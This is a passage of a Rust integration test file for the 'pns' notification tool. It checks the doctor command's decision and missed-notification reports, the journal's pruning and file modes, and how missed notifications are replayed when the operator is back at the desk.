    assert!(pending.is_empty(), "a publish left {pending:?} behind");
}

/// The section's heading, whose second half is where the actionId is told
/// honestly rather than printed as an empty field.
const DECISION_HEADING_TAIL: &str = " newest first (why a card did or did not fire). No actionId \
     is recorded: moshi mints it inside the approval round trip and never hands it back.";

/// What an absent ring says, parenthesis included.
const NO_DECISION_RECORDED: &str = "pns doctor: no decision has been recorded yet \
     (no event has run since this was installed, or none could be written).";

#[test]
fn the_doctor_prints_the_decision_section_after_its_summary_newest_first() {
    // AFTER THE SUMMARY, not before it: the census plus its summary is one
    // complete thought whose line order is already pinned above, and appending
    // cannot disturb it.
    let sandbox = Sandbox::new("doctor-decision-section");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    for turn in 1..=2 {
        run(logged_event(&sandbox).args(["--agent", &format!("c{turn}"), "--state", "done"]));
    }
    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    let lines: Vec<&str> = printed.lines().collect();
    // ANCHORED ON THE HEADING THIS LOCATES ITSELF, rather than on an offset
    // from the summary. Every assertion it was written to make survives (the
    // heading leads the section, newest first, and nothing follows it); what
    // it drops is its brittleness about which lines PRECEDE it, which the
    // pairing check now sits in.
    let heading = lines
        .iter()
        .position(|line| {
            *line == format!("pns doctor: the last 2 decisions,{DECISION_HEADING_TAIL}")
        })
        .unwrap_or_else(|| panic!("no decision heading in {printed}"));
    assert!(
        lines[heading + 1].contains(" c2/done "),
        "the newest decision leads: {printed}"
    );
    assert!(lines[heading + 2].contains(" c1/done "), "{printed}");
    assert_eq!(
        lines[heading + 3],
        NONE_WAITING,
        "and only the journal's count follows it: {printed}"
    );
    assert_eq!(
        lines.len(),
        heading + 4,
        "with nothing after that: {printed}"
    );
}

#[test]
fn the_doctors_exit_code_does_not_move_for_a_log_that_is_absent_or_unreadable() {
    // THE SECTION REPORTS HISTORY, NOT HEALTH. An empty log on a fresh machine
    // is not a failure, and neither is one nothing can parse.
    let sandbox = Sandbox::new("doctor-decision-empty");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    assert!(
        printed.ends_with(&format!("{NO_DECISION_RECORDED}\n{NONE_WAITING}\n")),
        "{printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends earned a zero: {}",
        stderr(&output)
    );

    // A LINE NOBODY CAN PARSE is quoted back and still costs nothing.
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    std::fs::write(sandbox.path("state/decisions"), "not a decision at all\n").expect("the ring");
    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    assert!(
        printed.ends_with(&format!(
            "  unreadable entry: \"not a decision at all\"\n{NONE_WAITING}\n"
        )),
        "{printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "a malformed log is not a failed send: {}",
        stderr(&output)
    );
}

#[test]
fn a_ring_the_doctor_cannot_read_is_named_by_its_error_kind_and_moves_no_exit_code() {
    // ABSENT IS ITS OWN STATE, with its own honest line. This is the OTHER
    // one: something is at the path and the read failed, which is a different
    // thing to say and the only arm an absent file never exercises. A
    // directory is the portable way to produce a real read error.
    let sandbox = Sandbox::new("doctor-decision-unreadable");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    std::fs::create_dir_all(sandbox.path("state/decisions")).expect("a directory at the ring");

    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    let lines: Vec<&str> = printed.lines().collect();
    assert_eq!(
        lines.last(),
        Some(&NONE_WAITING),
        "the journal's count still comes after it: {printed}"
    );
    let last = lines[lines.len() - 2];
    let opening = "pns doctor: the decision log could not be read (";
    assert!(last.starts_with(opening), "{printed}");
    assert!(
        last.ends_with(").") && last.len() > opening.len() + 2,
        "the kind is NAMED rather than left an empty parenthesis: {printed}"
    );
    assert!(
        !printed.contains(NO_DECISION_RECORDED),
        "and it is never told as an absent log: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends alone own the exit code: {}",
        stderr(&output)
    );
}

#[test]
fn a_fifo_at_the_rings_path_never_parks_the_doctor_and_is_named_by_its_kind() {
    // MEASURED: opening a FIFO BLOCKS until the other end is opened, for
    // READING as much as for writing, so a doctor that read the path raw
    // parks forever on a command a human is standing there waiting for. The
    // append side already refuses this path; the reader is the other half of
    // the same guard.
    let sandbox = Sandbox::new("doctor-decision-fifo");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let ring = ring_path(&sandbox);
    plant_fifo(&ring);

    let mut command = doctor_command(&sandbox);
    let output = output_before_the_deadline(&mut command);

    let printed = stdout(&output);
    let lines: Vec<&str> = printed.lines().collect();
    assert_eq!(
        lines.last(),
        Some(&NONE_WAITING),
        "the journal's count still comes after it: {printed}"
    );
    let last = lines[lines.len() - 2];
    let opening = "pns doctor: the decision log could not be read (";
    assert!(last.starts_with(opening), "{printed}");
    assert!(
        last.ends_with(").") && last.len() > opening.len() + 2,
        "the kind is NAMED rather than left an empty parenthesis: {printed}"
    );
    assert!(
        !printed.contains(NO_DECISION_RECORDED),
        "and it is never told as an absent log: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends alone own the exit code: {}",
        stderr(&output)
    );
    // REFUSED, NOT REPAIRED, the way the append refuses it.
    assert!(
        std::fs::symlink_metadata(&ring)
            .expect("the fifo")
            .file_type()
            .is_fifo(),
        "the ring's path was rewritten"
    );
}

#[test]
fn the_doctor_records_no_decision_of_its_own() {
    // A DOCTOR THAT RECORDED would push the decision the operator came to read
    // out of the ring by the act of going to look at it.
    let sandbox = Sandbox::new("doctor-decision-readonly");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    let ring = sandbox.path("state/decisions");
    let before = std::fs::read_to_string(&ring).expect("the ring");
    doctor_command(&sandbox).output().expect("the engine runs");
    assert_eq!(
        std::fs::read_to_string(&ring).expect("the ring"),
        before,
        "the doctor wrote to the ring it was reading"
    );
}

// --- the missed-notification journal ----------------------------------------

/// The journal's own depth, stated here rather than imported: a test that read
/// the constant it is checking would agree with any value the source held.
const JOURNAL_KEPT: usize = 25;

/// The decision ring's depth, for the same reason.
const RING_KEPT: usize = 5;

/// The operator's mute, published straight into the state directory.
///
/// THE ONLY WAY AN EVENT IS MISSED IN A TEST, and not a shortcut: the mute is
/// the one thing that zeroes a plan the matrix would have decorated, which is
/// what the journal exists to queue. Written rather than spawned through
/// `pns quiet`, because the engine reads one absolute expiry and a test can
/// state one without a second process.
fn mute(sandbox: &Sandbox) {
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    let expiry = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs()
        + 600;
    std::fs::write(sandbox.path("state/quiet-until"), format!("{expiry}\n")).expect("the mute");
}

/// The journal's path, with the state directory that holds it already made, so
/// a test can plant something there before the first event runs.
fn journal_path(sandbox: &Sandbox) -> std::path::PathBuf {
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    sandbox.path("state/missed-notifications")
}

/// The journal, oldest first, which is the order an append leaves it in.
fn journal(sandbox: &Sandbox) -> Vec<String> {
    std::fs::read_to_string(sandbox.path("state/missed-notifications"))
        .map(|contents| contents.lines().map(str::to_string).collect())
        .unwrap_or_default()
}

/// A journal of `count` entries, each carrying its own index, written the way
/// the engine leaves them. THE TEST IS THE REPLAYER'S STAND-IN here: reading
/// an entry back is what the file is for, and it is a test doing it rather
/// than a pns command.
fn planted_journal(count: usize) -> String {
    (0..count)
        .map(|which| {
            format!("{{\"at\":1756499000,\"agent\":\"claude\",\"state\":\"done\",\"project\":\"p\",\"branch\":\"b\",\"detail\":\"planted {which}\"}}\n")
        })
        .collect()
}

/// One entry's field, parsed. Only a test reads these.
fn field(entry: &str, name: &str) -> String {
    let parsed: serde_json::Value =
        serde_json::from_str(entry).unwrap_or_else(|error| panic!("{error}: {entry}"));
    parsed[name].as_str().unwrap_or_default().to_string()
}

#[test]
fn the_shared_append_prunes_each_ring_to_its_own_callers_depth() {
    // ONE HELPER, TWO DEPTHS, which is exactly where an off-by-one hides. Both
    // files start AT their caps, so the one event below pushes each of them
    // over by exactly one and the prune has to answer with a different number
    // for each. A journal silently pruning to the ring's five fails here.
    let sandbox = Sandbox::new("journal-two-depths");
    mute(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(JOURNAL_KEPT)).expect("the journal");
    let ring: String = (0..RING_KEPT)
        .map(|which| format!("1756499000 c{which}/done surface=Away\n"))
        .collect();
    std::fs::write(sandbox.path("state/decisions"), ring).expect("the ring");

    run(logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "done"])
        .args(["--detail", "this event's own summary"]));

    let waiting = journal(&sandbox);
    // THE APPEND REALLY RAN, asserted before the count: a journal nothing
    // wrote is still exactly its planted depth, so the count alone would pass
    // on a build that never journals anything at all.
    assert_eq!(
        field(waiting.last().expect("a journal"), "detail"),
        "this event's own summary",
        "the newest entry is this event's: {waiting:?}"
    );
    assert_eq!(
        waiting.len(),
        JOURNAL_KEPT,
        "the journal kept its own depth"
    );
    assert_eq!(
        decisions(&sandbox).len(),
        RING_KEPT,
        "and the ring kept its own"
    );
}

#[test]
fn a_missed_event_appends_exactly_one_entry_carrying_what_a_card_would_have_shown() {
    // THE MUTE'S QUEUE. The operator muted, so the matrix's card never fired
    // and nothing reached them, while the durable log still has the event in
    // full. What lands here is the minimum a replay needs to rebuild the card.
    let sandbox = Sandbox::new("journal-append");
    mute(&sandbox);
    run(logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "blocked"])
        .args(["--project", "dotfiles", "--branch", "main"])
        .args(["--detail", "a private summary"]));
    assert!(
        sandbox.fired("hermes"),
        "the durable log is exempt from the mute and still has the event in full"
    );
    assert!(!sandbox.fired("moshi"), "and the card the mute swallowed");

    let waiting = journal(&sandbox);
    assert_eq!(waiting.len(), 1, "exactly one entry: {waiting:?}");
    for (name, expected) in [
        ("agent", "claude"),
        ("state", "blocked"),
        ("project", "dotfiles"),
        ("branch", "main"),
        ("detail", "a private summary"),
    ] {
        assert_eq!(field(&waiting[0], name), expected, "{name}: {waiting:?}");
    }
    let parsed: serde_json::Value = serde_json::from_str(&waiting[0]).expect("one JSON object");
    assert!(
        parsed["at"].as_u64().is_some_and(|at| at > 1_700_000_000),
        "the decision's own clock read: {waiting:?}"
    );
}

#[test]
fn a_delivered_event_journals_nothing_at_all() {
    // NO FILE ON A MACHINE THAT NEVER MISSED ONE, which is what makes the
    // journal's presence meaningful. Away cards the phone, so this event
    // reached the operator and there is nothing to replay.
    let sandbox = Sandbox::new("journal-delivered");
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(sandbox.fired("moshi"), "the card really fired");
    assert!(
        !sandbox.path("state/missed-notifications").exists(),
        "a delivered event left a journal behind"
    );
}

#[test]
fn the_journal_keeps_only_the_most_recent_misses_with_the_oldest_gone() {
    // THE FILE IS WHAT IS WAITING, never everything that was ever missed. The
    // planted journal starts AT the cap, so this event pushes it over by
    // exactly one and the oldest entry is the one that has to go.
    let sandbox = Sandbox::new("journal-prune");
    mute(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(JOURNAL_KEPT)).expect("the journal");

    run(logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "done"])
        .args(["--detail", "the newest miss"]));

    let waiting = journal(&sandbox);
    assert_eq!(waiting.len(), JOURNAL_KEPT, "got {} entries", waiting.len());
    assert_eq!(
        field(&waiting[0], "detail"),
        "planted 1",
        "the oldest was dropped: {waiting:?}"
    );
    assert_eq!(
        field(waiting.last().expect("a journal"), "detail"),
        "the newest miss",
        "and the newest is last: {waiting:?}"
    );
}

#[test]
fn a_fifo_at_the_journals_path_is_refused_untouched_and_never_parks_the_event() {
    // MEASURED ON THE RING and inherited here by sharing its append: opening a
    // FIFO for writing BLOCKS until something opens the read end, so an append
    // that trusted the path would park the hook that called it, on every
    // event, until the machine is rebooted.
    let sandbox = Sandbox::new("journal-fifo");
    mute(&sandbox);
    let path = journal_path(&sandbox);
    assert!(
        std::process::Command::new("mkfifo")
            .arg(&path)
            .status()
            .expect("mkfifo runs")
            .success(),
        "the fixture has to be a real FIFO"
    );

    let output = output_before_the_deadline(
        logged_event(&sandbox).args(["--agent", "claude", "--state", "done", "--detail", "x"]),
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "a journal nobody could write costs the event nothing"
    );
    assert!(sandbox.fired("hermes"), "the durable log still fired");
    assert_eq!(stdout(&output), "", "nothing is said about the journal");
    // THE WHOLE STREAM, not a substring of it. A leaked `eprintln!("{error}")`
    // prints the operating system's own words, which share no predictable word
    // with "missed", so only an empty stream is evidence that the drop really
    // is a drop.
    assert_eq!(stderr(&output), "", "the event path gained stderr");
    // REFUSED, NOT REPAIRED: the path still holds what it held.
    assert!(
        std::fs::symlink_metadata(&path)
            .expect("the fifo")
            .file_type()
            .is_fifo(),
        "the journal's path was rewritten"
    );
}

#[test]
fn a_state_directory_that_cannot_be_written_costs_a_missed_event_nothing() {
    // FAIL-QUIET, in `record_decision`'s style. A journal entry that did not
    // land costs a replay, never a card, and a complaint printed here would
    // put a line about the state directory into every hook's output for the
    // rest of this machine's life.
    let sandbox = Sandbox::new("journal-unwritable");
    mute(&sandbox);
    set_state_mode(&sandbox, 0o500);
    let output = logged_event(&sandbox)
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .output()
        .expect("the engine runs");
    // ALWAYS PUT BACK before the assertions: a directory left at 0500 is one
    // the sandbox's own cleanup cannot remove.
    set_state_mode(&sandbox, 0o700);

    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    assert!(sandbox.fired("hermes"), "every channel still fires");
    assert_eq!(stdout(&output), "", "nothing is said about the write");
    // THE WHOLE STREAM, for the reason the FIFO's test states: an unwritable
    // state directory fails the decision record and the journal entry alike,
    // and neither complaint would have to contain either word to be a
    // complaint.
    assert_eq!(stderr(&output), "", "the event path gained stderr");
    assert!(
        !sandbox.path("state/missed-notifications").exists(),
        "and nothing was written"
    );
}

/// The journal's permission bits.
fn journal_mode(sandbox: &Sandbox) -> u32 {
    std::os::unix::fs::PermissionsExt::mode(
        &std::fs::metadata(sandbox.path("state/missed-notifications"))
            .expect("the journal")
            .permissions(),
    ) & 0o777
}

#[test]
fn the_journal_is_created_readable_and_writable_by_its_owner_alone() {
    // THE MODE ITSELF IS THE ASSERTION, not "narrower than the umask": the
    // file holds the operator's own text and nothing in the state directory
    // has a reason to be world-readable.
    let sandbox = Sandbox::new("journal-mode");
    mute(&sandbox);
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert_eq!(journal_mode(&sandbox), 0o600, "the append created it");

    // AND AFTER A PRUNE, which is a SECOND create: the prune publishes by
    // renaming a pending file over the journal, so the pending file's mode is
    // the one the journal ends up wearing.
    std::fs::write(journal_path(&sandbox), planted_journal(JOURNAL_KEPT)).expect("the journal");
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done", "--detail", "y"]));
    assert_eq!(
        journal(&sandbox).len(),
        JOURNAL_KEPT,
        "the prune really ran"
    );
    assert_eq!(journal_mode(&sandbox), 0o600, "the prune republished it");
}

/// What the doctor says about a journal holding two entries. The sentence
/// names the replayer now, because the binary has one.
const TWO_WAITING: &str = "pns doctor: 2 missed notifications are waiting to be replayed; \
     the next event that raises a banner or a card while the operator is not away \
     delivers them.";

/// What it says when there is none, which is deliberately about what is
/// RECORDED: an empty journal means either nothing was missed or a write did
/// not land, and the line claims neither.
const NONE_WAITING: &str = "pns doctor: no missed notification is recorded.";

#[test]
fn the_doctor_counts_the_journal_last_and_never_moves_its_exit_code_for_it() {
    // HISTORY BELOW HISTORY, both below the gradeable pairing lines. An
    // unreplayed journal is not a failure, so the count sits under the one
    // section that already cannot move the exit code.
    let sandbox = Sandbox::new("doctor-journal-count");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done"]));
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");

    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    let lines: Vec<&str> = printed.lines().collect();
    let heading = lines
        .iter()
        .position(|line| *line == format!("pns doctor: the last decision,{DECISION_HEADING_TAIL}"))
        .unwrap_or_else(|| panic!("no decision heading in {printed}"));
    assert_eq!(
        lines.last(),
        Some(&TWO_WAITING),
        "the count is the last line: {printed}"
    );
    assert_eq!(
        lines.len(),
        heading + 3,
        "one decision, then the count, and nothing else: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends and the pairing alone own the exit code: {}",
        stderr(&output)
    );
}

#[test]
fn a_journal_the_doctor_cannot_read_is_named_by_its_error_kind_and_moves_no_exit_code() {
    // ABSENT IS ITS OWN STATE with its own honest line. This is the OTHER one:
    // something is at the path and the read failed, which is a different thing
    // to say. A directory is the portable way to produce a real read error.
    let sandbox = Sandbox::new("doctor-journal-unreadable");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    std::fs::create_dir_all(journal_path(&sandbox)).expect("a directory at the journal");

    let output = doctor_command(&sandbox).output().expect("the engine runs");
    let printed = stdout(&output);
    let last = printed.lines().last().unwrap_or_default();
    let opening = "pns doctor: the missed-notification journal could not be read (";
    assert!(last.starts_with(opening), "{printed}");
    assert!(
        last.ends_with(").") && last.len() > opening.len() + 2,
        "the kind is NAMED rather than left an empty parenthesis: {printed}"
    );
    assert!(
        !printed.contains(NONE_WAITING),
        "and it is never told as an absent journal: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends alone own the exit code: {}",
        stderr(&output)
    );
}

#[test]
fn a_fifo_at_the_journals_path_never_parks_the_doctor_and_is_named_by_its_kind() {
    // THE SAME PARK, on the file this slice added: the count is read on the
    // doctor's way out, so a FIFO here wedges the command after it has
    // already sent to every channel.
    let sandbox = Sandbox::new("doctor-journal-fifo");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    let path = journal_path(&sandbox);
    plant_fifo(&path);

    let mut command = doctor_command(&sandbox);
    let output = output_before_the_deadline(&mut command);

    let printed = stdout(&output);
    let last = printed.lines().last().unwrap_or_default();
    let opening = "pns doctor: the missed-notification journal could not be read (";
    assert!(last.starts_with(opening), "{printed}");
    assert!(
        last.ends_with(").") && last.len() > opening.len() + 2,
        "the kind is NAMED rather than left an empty parenthesis: {printed}"
    );
    assert!(
        !printed.contains(NONE_WAITING),
        "and it is never told as an absent journal: {printed}"
    );
    assert_eq!(
        output.status.code(),
        Some(0),
        "the sends alone own the exit code: {}",
        stderr(&output)
    );
    // REFUSED, NOT REPAIRED: the path still holds what it held.
    assert!(
        std::fs::symlink_metadata(&path)
            .expect("the fifo")
            .file_type()
            .is_fifo(),
        "the journal's path was rewritten"
    );
}

#[test]
fn the_doctor_leaves_the_journal_exactly_as_it_found_it() {
    // READING IS ALLOWED, WRITING IS NOT. A doctor that journaled would file a
    // miss for the act of going to look for one, and its own test send is the
    // last event that should ever be replayed.
    let sandbox = Sandbox::new("doctor-journal-readonly");
    sandbox.write_config(EVERY_DISPATCHED_CHANNEL);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");
    let before = std::fs::read(journal_path(&sandbox)).expect("the journal");

    doctor_command(&sandbox).output().expect("the engine runs");

    assert_eq!(
        std::fs::read(journal_path(&sandbox)).expect("the journal"),
        before,
        "the doctor wrote to the journal it was reading"
    );
    let mut state: Vec<String> = std::fs::read_dir(sandbox.path("state"))
        .expect("the state dir")
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .collect();
    state.sort();
    assert_eq!(
        state,
        ["missed-notifications"],
        "the doctor left something else in the state directory"
    );
}

// --- the catch-up replay ----------------------------------------------------

/// An event the operator is PRESENT for: at the desk with the origin pane out
/// of sight, which is the matrix row that earns a banner and so the row a
/// replay rides on.
///
/// AWAY IS DELIBERATELY NOT IT, and away is what the bare sandbox gives:
/// away is where misses are made and never where they are delivered, so an
/// away event is the one row that must NOT flush the queue.
fn present_event(sandbox: &Sandbox) -> std::process::Command {
    let mut command = logged_event(sandbox);
    command.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut command, false);
    command
        .args(["--agent", "claude", "--state", "done"])
        .args(["--detail", "the live turn", "--pane", "t1:p2"]);
    command
}

/// Channels that record EVERY event they are handed rather than only the last.
///
/// THE SANDBOX'S OWN STUBS TRUNCATE, which is right for a suite asking whether
/// a channel fired at all and useless here: a replay is a SECOND notification
/// on the same channel, and a truncating stub shows one file either way.
fn record_every_event(sandbox: &Sandbox) {
    for channel in ["moshi", "hermes", "macos-banner"] {
        sandbox.stub_channel(
            channel,
            &format!("cat >>\"{}/{channel}.events\"", sandbox.display()),
        );
    }
}

/// Every event one channel was handed, in the order it got them.
fn events(sandbox: &Sandbox, channel: &str) -> Vec<serde_json::Value> {
    std::fs::read_to_string(sandbox.path(&format!("{channel}.events")))
        .unwrap_or_default()
        .lines()
        .map(|line| {
            serde_json::from_str(line).unwrap_or_else(|error| panic!("{channel}: {error}: {line}"))
        })
        .collect()
}

/// Everything the state directory holds, sorted. A claim file the run left
/// behind shows up here and nowhere else.
fn state_files(sandbox: &Sandbox) -> Vec<String> {
    let mut held: Vec<String> = std::fs::read_dir(sandbox.path("state"))
        .expect("the state dir")
        .flatten()
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .collect();
    held.sort();
    held
}

#[test]
fn a_present_event_delivers_one_extra_notification_carrying_the_whole_journal() {
    // THE RETURN TRANSITION IS THIS EVENT. The operator is at the desk with
    // the origin pane out of sight, so the live turn earns a banner, and the
    // queue rides out on the same legs that banner did.
    let sandbox = Sandbox::new("replay-delivers");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");

    let output = run(&mut present_event(&sandbox));

    // NOTHING IS PRINTED. The event path prints only what a REPORTING leg
    // said, and this rides an event whose stdout a harness hook reads.
    assert_eq!(
        stdout(&output),
        "",
        "the replay reached the hook's own stdout"
    );
    assert_eq!(
        stderr(&output),
        "",
        "the replay reached the hook's own stderr"
    );
    let raised = events(&sandbox, "macos-banner");
    assert_eq!(
        raised.len(),
        2,
        "the live event and ONE replay carrying both entries: {raised:?}"
    );
    assert_eq!(raised[0]["state"], "done", "the live event goes first");
    // ONE SYNTHETIC EVENT, visibly not a live agent card: a replayed card that
    // looked live would be lying about time.
    assert_eq!(raised[1]["agent"], "pns", "{raised:?}");
    assert_eq!(raised[1]["state"], "missed", "{raised:?}");
    assert_eq!(raised[1]["title"], "pns \u{b7} missed", "{raised:?}");
    // EMPTY PROJECT AND BRANCH, because a batch spans both; empty pane,
    // because an id from an hour ago may name a pane that no longer exists.
    for empty in ["project", "branch", "pane"] {
        assert_eq!(raised[1][empty], "", "{empty}: {raised:?}");
    }
    let body = raised[1]["detail"].as_str().expect("a detail");
    assert!(
        body.starts_with("2 missed notifications. "),
        "the true count leads: {body}"
    );
    // BOTH ARE FOUND FIRST, and then compared. An `Option` compare answers
    // true for an entry that is not in the body at all, so the comparison
    // alone would pass a card carrying neither.
    let newest = body
        .find("planted 1")
        .expect("the newest entry is in the body");
    let oldest = body
        .find("planted 0")
        .expect("the oldest entry is in the body");
    assert!(
        newest < oldest,
        "newest first, because the preview cuts from the start: {body}"
    );
    // THE LEGS ARE THIS DECISION'S OWN, VERBATIM: the durable log is one of
    // them, so it is handed the same synthetic event the banner was.
    let logged = events(&sandbox, "hermes");
    assert_eq!(
        logged.len(),
        2,
        "the replay rode only the banner leg: {logged:?}"
    );
    assert_eq!(logged[1]["state"], "missed", "{logged:?}");
    assert_eq!(
        logged[1]["detail"], raised[1]["detail"],
        "the two legs were handed different bodies"
    );
    assert!(
        !sandbox.path("state/missed-notifications").exists(),
        "the journal was consumed: {:?}",
        state_files(&sandbox)
    );
}

#[test]
fn a_replay_is_never_a_second_event_in_the_ring_or_the_journal() {
    // THE LOOP THIS CLOSES. Fed back through the one event path, the replay
    // would take a second decision, write a second ring line for something
    // that is not an event, fire a second pulse and RE-JOURNAL itself, so the
    // next replay would replay the replay. One ring line, naming the live
    // event, is what says the replay stayed a dispatch.
    let sandbox = Sandbox::new("replay-not-an-event");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");

    run(&mut present_event(&sandbox));

    assert_eq!(
        events(&sandbox, "macos-banner").len(),
        2,
        "the replay really was delivered, which is what makes the counts below mean anything"
    );
    let recorded = decisions(&sandbox);
    assert_eq!(recorded.len(), 1, "one event, one line: {recorded:?}");
    assert!(
        recorded[0].contains(" claude/done "),
        "and it is the LIVE event's: {recorded:?}"
    );
    assert!(
        !recorded[0].contains("pns/missed"),
        "the replay recorded a decision of its own: {recorded:?}"
    );
    assert!(
        !sandbox.path("state/missed-notifications").exists(),
        "the replay journaled itself: {:?}",
        state_files(&sandbox)
    );
}

#[test]
fn an_away_event_delivers_no_replay_and_leaves_the_journal_byte_identical() {
    // AWAY IS WHERE MISSES ARE MADE AND NEVER WHERE THEY ARE DELIVERED. The
    // Away row always cards, so without the surface clause this row would
    // flush the queue at the phone of an operator who has not come back.
    let sandbox = Sandbox::new("replay-away");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");
    let before = std::fs::read(journal_path(&sandbox)).expect("the journal");

    run(logged_event(&sandbox).args(["--agent", "claude", "--state", "done", "--detail", "x"]));

    let carded = events(&sandbox, "moshi");
    assert_eq!(
        carded.len(),
        1,
        "the away card fired and nothing rode along: {carded:?}"
    );
    assert_eq!(carded[0]["state"], "done", "{carded:?}");
    assert_eq!(
        std::fs::read(journal_path(&sandbox)).expect("the journal"),
        before,
        "the journal was touched"
    );
}

#[test]
fn a_muted_event_queues_its_own_miss_and_replays_nothing() {
    // THE MUTE IS FREE, and it is exactly what the operator asked for: a mute
    // zeroes the plan, so a muted run has no decoration and cannot flush the
    // queue it is filling. Nothing reads `muted` on the replay path.
    let sandbox = Sandbox::new("replay-muted");
    record_every_event(&sandbox);
    mute(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");

    run(&mut present_event(&sandbox));

    let waiting = journal(&sandbox);
    assert_eq!(
        waiting.len(),
        3,
        "its own miss joined the queue: {waiting:?}"
    );
    assert_eq!(
        field(waiting.last().expect("a journal"), "detail"),
        "the live turn",
        "and it is this event's: {waiting:?}"
    );
    assert!(
        events(&sandbox, "macos-banner").is_empty(),
        "the mute swallowed the banner, so nothing carried a replay"
    );
    let logged = events(&sandbox, "hermes");
    assert_eq!(
        logged.len(),
        1,
        "the durable log is exempt from the mute and still saw ONE event: {logged:?}"
    );
    assert_eq!(logged[0]["state"], "done", "{logged:?}");
}

#[test]
fn a_fifo_at_the_journals_path_is_refused_untouched_and_never_parks_the_replay() {
    // MEASURED ON THE RING and inherited by every reader of these files:
    // opening a FIFO BLOCKS until the other end is opened, for READING as
    // much as for writing, so a replay that trusted the path would park the
    // hook that called it. REFUSED RATHER THAN REPAIRED, which is what the
    // claim's own guard is for: a rename would move the operator's FIFO to
    // the claim path and the remove would then destroy it.
    let sandbox = Sandbox::new("replay-fifo");
    record_every_event(&sandbox);
    let path = journal_path(&sandbox);
    plant_fifo(&path);

    let mut command = present_event(&sandbox);
    let output = output_before_the_deadline(&mut command);

    assert_eq!(
        output.status.code(),
        Some(0),
        "a journal nobody could read costs the event nothing"
    );
    let raised = events(&sandbox, "macos-banner");
    assert_eq!(raised.len(), 1, "the live event alone: {raised:?}");
    assert_eq!(raised[0]["state"], "done", "{raised:?}");
    assert_eq!(stdout(&output), "", "nothing is said about the journal");
    // THE WHOLE STREAM, not a substring of it: a leaked error print uses the
    // operating system's own words, which share no predictable word with
    // anything this slice writes.
    assert_eq!(stderr(&output), "", "the event path gained stderr");
    assert!(
        std::fs::symlink_metadata(&path)
            .expect("the fifo")
            .file_type()
            .is_fifo(),
        "the journal's path was rewritten"
    );
}

#[test]
fn an_event_with_nothing_waiting_delivers_and_leaves_exactly_what_it_did_before() {
    // A MACHINE THAT NEVER MISSED ONE has no journal file at all, which is by
    // far the common case, and this slice must be invisible on it: the same
    // one notification, the same empty streams, the same exit, and nothing new
    // in the state directory.
    let sandbox = Sandbox::new("replay-nothing-waiting");
    record_every_event(&sandbox);

    let output = present_event(&sandbox).output().expect("the engine runs");

    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    assert_eq!(stdout(&output), "", "the run gained a line");
    assert_eq!(stderr(&output), "", "the run gained stderr");
    let raised = events(&sandbox, "macos-banner");
    assert_eq!(
        raised.len(),
        1,
        "one notification, the live one: {raised:?}"
    );
    assert_eq!(raised[0]["state"], "done", "{raised:?}");
    assert_eq!(
        state_files(&sandbox),
        ["decisions"],
        "the run left something new in the state directory"
    );
}

#[test]
fn an_event_narrowed_to_no_channel_at_all_leaves_the_journal_where_it_found_it() {
    // NOWHERE TO SEND IS NOT A REPLAY. Both narrowing flags suppress every
    // channel while the plan still says banner, so the replay condition is
    // true and the dispatch would reach nothing: claiming the journal here
    // would eat the queue for a typing mistake.
    let sandbox = Sandbox::new("replay-no-legs");
    record_every_event(&sandbox);
    std::fs::write(journal_path(&sandbox), planted_journal(2)).expect("the journal");
    let before = std::fs::read(journal_path(&sandbox)).expect("the journal");

    let output = run(present_event(&sandbox).args(["--local-only", "--remote-only"]));

    assert!(
        stdout(&output).contains("post SKIPPED"),
        "the contradiction really was reached: {}",
        stdout(&output)
